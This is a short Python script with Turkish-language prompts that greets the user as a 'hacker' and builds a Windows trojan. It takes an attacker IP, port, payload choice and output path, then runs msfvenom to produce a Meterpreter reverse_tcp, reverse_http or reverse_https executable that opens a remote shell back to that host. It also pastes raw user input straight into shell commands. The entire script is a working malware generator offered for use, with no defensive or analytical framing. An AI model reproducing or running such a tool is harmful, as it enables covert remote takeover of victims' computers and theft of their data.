#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet TROJAN")
print("""
Trojan Oluşturmaya Hoş Geldin Hacker : )

""")

ip = input("Local veya Dış Ip Girin : ")
port = input("Port Girin : ")
print("""
1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https
""")
payload = input("Payload No Girin: ")
kayityeri = input("Kayıt Yeri Girin: ")

if(payload=="1"):
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o 	" + kayityeri)
elif(payload=="2"):
	os.system("msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o 	" + kayityeri)
elif(payload=="3"):
	os.system("msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o 	" + kayityeri)
else:
	print("Hatalı seçim!")
